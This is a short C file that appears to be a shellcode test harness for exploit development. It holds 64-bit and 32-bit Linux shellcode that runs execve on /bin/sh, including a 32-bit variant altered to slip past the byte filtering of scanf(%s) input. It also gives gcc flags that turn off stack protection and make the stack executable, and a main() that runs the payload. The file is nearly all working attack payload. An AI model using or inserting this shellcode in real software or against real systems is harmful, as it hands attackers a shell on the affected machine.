#include <stdio.h>

//  64bit shellcode 
// gcc -o shell shell.c -m64 -fno-stack-protector -z execstack
// char shellcode[] = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";

// 32bit shellcode 
// gcc -m32 -o shell shell.c -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
// shellcode without VT(\x0b) -> for scanf(%s)
// char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

// 32bit shellcode 
// gcc -m32 -o shell shell.c -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
// shellcode without VT(\x0b) -> for scanf(%s)
char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0e\x2c\x03\xcd\x80";

int main(){
    
    (*(void (*)()) shellcode)();
    
}